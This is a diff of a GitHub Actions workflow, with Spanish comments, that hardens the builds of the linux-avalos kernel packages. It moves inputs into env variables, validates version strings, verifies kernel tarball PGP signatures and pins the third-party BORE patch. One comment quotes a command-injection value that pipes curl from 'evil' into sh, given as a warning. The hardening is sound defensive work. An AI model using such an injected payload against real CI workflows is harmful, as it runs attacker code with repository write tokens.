@@ -45,9 +45,14 @@ jobs:
     steps:
       - name: Obtener ultima version estable
         id: get_ver
+        env:
+          # NUNCA interpolar ${{ inputs.* }} dentro de `run:`: GitHub lo pega como TEXTO en el script antes de ejecutarlo,
+          # así que un valor como `7.2"; curl evil|sh; "` ejecuta código con el GITHUB_TOKEN (contents: write). Por env
+          # llega como dato y se valida abajo.
+          INPUT_KERNEL_VERSION: ${{ github.event.inputs.kernel_version }}
         run: |
-          if [[ -n "${{ github.event.inputs.kernel_version }}" ]]; then
-            KERNEL_VER="${{ github.event.inputs.kernel_version }}"
+          if [[ -n "$INPUT_KERNEL_VERSION" ]]; then
+            KERNEL_VER="$INPUT_KERNEL_VERSION"
             echo "Version especificada manualmente: $KERNEL_VER"
           else
             KERNEL_VER=""
@@ -95,14 +100,22 @@ jobs:
             echo "Version detectada: $KERNEL_VER"
           fi
 
+          # Formato de versión de kernel.org (7.2, 7.2.14, 7.3-rc1; Arch escribe 7.3.rc1). Esta cadena se interpola después en `run:` de
+          # otros jobs y en el commit del bump: si no es una versión, se corta aquí.
+          # LC_ALL=C en un subshell: los rangos de [[ =~ ]] siguen el orden de COLACIÓN del locale (en_US.UTF-8 acepta «７.２»)
+          if ! ( LC_ALL=C; [[ "$KERNEL_VER" =~ ^[0-9]+\.[0-9]+(\.[0-9]+)?([.-]rc[0-9]+)?$ ]] ); then
+            echo "::error::version de kernel con formato inesperado: '$KERNEL_VER' (manual o devuelta por la API de Arch/kernel.org)"
+            exit 1
+          fi
           echo "kernel_ver=$KERNEL_VER" >> "$GITHUB_OUTPUT"
           echo "Version final: $KERNEL_VER"
 
       - name: Revisar si ya esta construida
         id: check_build
+        env:
+          FORCE: ${{ github.event.inputs.force_rebuild }}
+          KERNEL_VER: ${{ steps.get_ver.outputs.kernel_ver }}
         run: |
-          KERNEL_VER="${{ steps.get_ver.outputs.kernel_ver }}"
-          FORCE="${{ github.event.inputs.force_rebuild }}"
 
           if [[ "$FORCE" == "true" ]]; then
             echo "Rebuild forzado"
@@ -270,6 +283,9 @@ jobs:
         # inofensivo, pkgrel no necesita ser correlativo sin huecos.
         if: success()
         continue-on-error: true
+        env:
+          # el nombre de la rama lo elige quien hace push: por env, nunca pegado en el script
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -uo pipefail
           git config --global --add safe.directory "$GITHUB_WORKSPACE" || true
@@ -292,7 +308,7 @@ jobs:
             git -C "$GITHUB_WORKSPACE" commit -m "chore(kernel): bump linux-avalos a ${{ needs.check-version.outputs.kernel_ver }}"
             git -C "$GITHUB_WORKSPACE" push \
               "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ env.AVALOS_REPO }}.git" \
-              "HEAD:${{ github.ref_name }}"
+              "HEAD:refs/heads/$REF_NAME"
             echo "PKGBUILD actualizado y commiteado (${{ needs.check-version.outputs.kernel_ver }})"
           fi
 
@@ -344,6 +360,14 @@ jobs:
             pahole cpio perl tar xz zstd libelf \
             github-cli
 
+      # Solo lo necesario para verificar el tarball. ANTES de bajar el artifact: actions/checkout limpia el workspace.
+      - name: Checkout parcial (verificador del tarball del kernel)
+        uses: actions/checkout@v7
+        with:
+          sparse-checkout: |
+            scripts/verify-kernel-tarball.py
+          sparse-checkout-cone-mode: false
+
       - name: Descargar PKGBUILD preparado
         uses: actions/download-artifact@v7
         with:
@@ -355,6 +379,21 @@ jobs:
           useradd -m -G wheel builder
           echo "builder ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
           chown -R builder:builder ${{ env.PKGBUILD_DIR }}
+
+      - name: Verificar la firma PGP del tarball del kernel
+        # El PKGBUILD usa sha256sums 'SKIP' y makepkg corre con --skippgpcheck: sin este paso el tarball (de una CDN de
+        # terceros) se aceptaba tal cual. Baja linux-<ver>.tar.xz + .tar.sign, comprueba la firma contra las huellas
+        # pineadas de Linus Torvalds y Greg KH y deja el tarball verificado en el directorio del PKGBUILD: makepkg lo
+        # encuentra ahí y no lo vuelve a bajar. Si la verificación falla el build se detiene.
+        # Interruptor sin commit: variable del repo AVALOS_KERNEL_PGP=warn acepta (con aviso) una firma VÁLIDA de otra clave
+        # — p. ej. si un release sale firmado por Sasha Levin, cuya huella no está pineada. Cualquier otro valor = enforce.
+        env:
+          KERNEL_VER: ${{ needs.check-version.outputs.kernel_ver }}
+          PGP_MODE: ${{ vars.AVALOS_KERNEL_PGP }}
+        run: |
+          ARGS=()
+          [[ "$PGP_MODE" == "warn" ]] && ARGS+=(--allow-unpinned-signer)
+          python3 scripts/verify-kernel-tarball.py --version "$KERNEL_VER" --dest "${{ env.PKGBUILD_DIR }}" "${ARGS[@]}"
 
       - name: Compilar linux-avalos
         run: |
@@ -405,6 +444,16 @@ jobs:
             pahole cpio perl tar xz zstd libelf \
             github-cli
 
+      # Solo lo necesario para revisar el parche BORE. ANTES de bajar el artifact: actions/checkout limpia el workspace.
+      - name: Checkout parcial (verificador del parche BORE)
+        uses: actions/checkout@v7
+        with:
+          sparse-checkout: |
+            scripts/check-bore-patch.py
+            scripts/verify-kernel-tarball.py
+            pkgs/linux-avalos/bore.pin
+          sparse-checkout-cone-mode: false
+
       - name: Descargar PKGBUILD preparado
         uses: actions/download-artifact@v7
         with:
@@ -416,6 +465,21 @@ jobs:
           useradd -m -G wheel builder
           echo "builder ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
           chown -R builder:builder ${{ env.PKGBUILD_DIR }}
+
+      - name: Verificar la firma PGP del tarball del kernel
+        # El PKGBUILD usa sha256sums 'SKIP' y makepkg corre con --skippgpcheck: sin este paso el tarball (de una CDN de
+        # terceros) se aceptaba tal cual. Baja linux-<ver>.tar.xz + .tar.sign, comprueba la firma contra las huellas
+        # pineadas de Linus Torvalds y Greg KH y deja el tarball verificado en el directorio del PKGBUILD: makepkg lo
+        # encuentra ahí y no lo vuelve a bajar. Si la verificación falla el build se detiene.
+        # Interruptor sin commit: variable del repo AVALOS_KERNEL_PGP=warn acepta (con aviso) una firma VÁLIDA de otra clave
+        # — p. ej. si un release sale firmado por Sasha Levin, cuya huella no está pineada. Cualquier otro valor = enforce.
+        env:
+          KERNEL_VER: ${{ needs.check-version.outputs.kernel_ver }}
+          PGP_MODE: ${{ vars.AVALOS_KERNEL_PGP }}
+        run: |
+          ARGS=()
+          [[ "$PGP_MODE" == "warn" ]] && ARGS+=(--allow-unpinned-signer)
+          python3 scripts/verify-kernel-tarball.py --version "$KERNEL_VER" --dest "${{ env.PKGBUILD_DIR }}" "${ARGS[@]}"
 
       - name: Compilar linux-avalos-bore
         # FIX-JOBS (18-ago): antes tenia continue-on-error a nivel de step
@@ -464,10 +528,18 @@ jobs:
           # mismo pkgdesc que el estandar, palabra por palabra — no se podía
           # distinguir uno de otro por descripción.
 
-          BORE_URL="https://raw.githubusercontent.com/CachyOS/kernel-patches/master/${MAJOR}.${MINOR}/sched/0001-bore.patch"
-          if curl -fsSL "$BORE_URL" -o "$BORE_DIR/bore-scheduler.patch" 2>/dev/null \
-             && [[ -s "$BORE_DIR/bore-scheduler.patch" ]]; then
-            echo "Parche BORE descargado para ${MAJOR}.${MINOR}"
+          # El parche viene de un repositorio AJENO y acaba en un kernel que AvalOS firma. Antes se bajaba de «master»
+          # (rama mutable) sin ninguna comprobación. Ahora: (1) el ref sale de bore.pin («master», o el commit revisado si
+          # mode=enforce); (2) scripts/check-bore-patch.py rechaza parches que toquen algo fuera del planificador o traigan
+          # patrones que un planificador no necesita, y avisa si el parche cambió desde la última revisión humana.
+          BORE_PIN="${{ env.PKGBUILD_DIR }}/bore.pin"
+          BORE_REF=$(python3 scripts/check-bore-patch.py --print-ref --version "${MAJOR}.${MINOR}" --pin "$BORE_PIN" || echo master)
+          BORE_URL="https://raw.githubusercontent.com/CachyOS/kernel-patches/${BORE_REF}/${MAJOR}.${MINOR}/sched/0001-bore.patch"
+          if curl -fsSL --max-time 60 --max-filesize 262144 "$BORE_URL" -o "$BORE_DIR/bore-scheduler.patch" 2>/dev/null \
+             && [[ -s "$BORE_DIR/bore-scheduler.patch" ]] \
+             && python3 scripts/check-bore-patch.py "$BORE_DIR/bore-scheduler.patch" --version "${MAJOR}.${MINOR}" \
+                  --pin "$BORE_PIN" --summary "$GITHUB_STEP_SUMMARY"; then
+            echo "Parche BORE descargado y revisado para ${MAJOR}.${MINOR} (ref: ${BORE_REF})"
             sed -i 's|x86-64-v3, AMD+Intel, EEVDF|x86-64-v3, AMD+Intel, EEVDF+BORE|g' "$BORE_DIR/PKGBUILD"
 
             if grep -qE '^\s*"config"' "$BORE_DIR/PKGBUILD"; then
@@ -486,7 +558,8 @@ jobs:
             # linux-avalos-bore que en realidad es EEVDF puro y `pacman -Qi` mentia. Ahora la
             # descripcion dice la verdad y el run deja un warning visible en Actions.
             sed -i 's|x86-64-v3, AMD+Intel, EEVDF|x86-64-v3, AMD+Intel, EEVDF (SIN BORE: parche no disponible para esta version)|g' "$BORE_DIR/PKGBUILD"
-            echo "::warning::linux-avalos-bore se compila SIN el parche BORE (${BORE_URL} no disponible)"
+            rm -f "$BORE_DIR/bore-scheduler.patch"      # por si se bajó pero el verificador lo rechazó
+            echo "::warning::linux-avalos-bore se compila SIN el parche BORE (${BORE_URL} no disponible o rechazado por check-bore-patch.py: ver el resumen del job)"
           fi
 
           sudo -u builder env \
@@ -533,6 +606,14 @@ jobs:
             pahole cpio perl tar xz zstd libelf \
             github-cli
 
+      # Solo lo necesario para verificar el tarball. ANTES de bajar el artifact: actions/checkout limpia el workspace.
+      - name: Checkout parcial (verificador del tarball del kernel)
+        uses: actions/checkout@v7
+        with:
+          sparse-checkout: |
+            scripts/verify-kernel-tarball.py
+          sparse-checkout-cone-mode: false
+
       - name: Descargar PKGBUILD preparado
         uses: actions/download-artifact@v7
         with:
@@ -544,6 +625,21 @@ jobs:
           useradd -m -G wheel builder
           echo "builder ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
           chown -R builder:builder ${{ env.PKGBUILD_DIR }}
+
+      - name: Verificar la firma PGP del tarball del kernel
+        # El PKGBUILD usa sha256sums 'SKIP' y makepkg corre con --skippgpcheck: sin este paso el tarball (de una CDN de
+        # terceros) se aceptaba tal cual. Baja linux-<ver>.tar.xz + .tar.sign, comprueba la firma contra las huellas
+        # pineadas de Linus Torvalds y Greg KH y deja el tarball verificado en el directorio del PKGBUILD: makepkg lo
+        # encuentra ahí y no lo vuelve a bajar. Si la verificación falla el build se detiene.
+        # Interruptor sin commit: variable del repo AVALOS_KERNEL_PGP=warn acepta (con aviso) una firma VÁLIDA de otra clave
+        # — p. ej. si un release sale firmado por Sasha Levin, cuya huella no está pineada. Cualquier otro valor = enforce.
+        env:
+          KERNEL_VER: ${{ needs.check-version.outputs.kernel_ver }}
+          PGP_MODE: ${{ vars.AVALOS_KERNEL_PGP }}
+        run: |
+          ARGS=()
+          [[ "$PGP_MODE" == "warn" ]] && ARGS+=(--allow-unpinned-signer)
+          python3 scripts/verify-kernel-tarball.py --version "$KERNEL_VER" --dest "${{ env.PKGBUILD_DIR }}" "${ARGS[@]}"
 
       - name: Compilar linux-avalos-compat (x86-64-v2)
         run: |
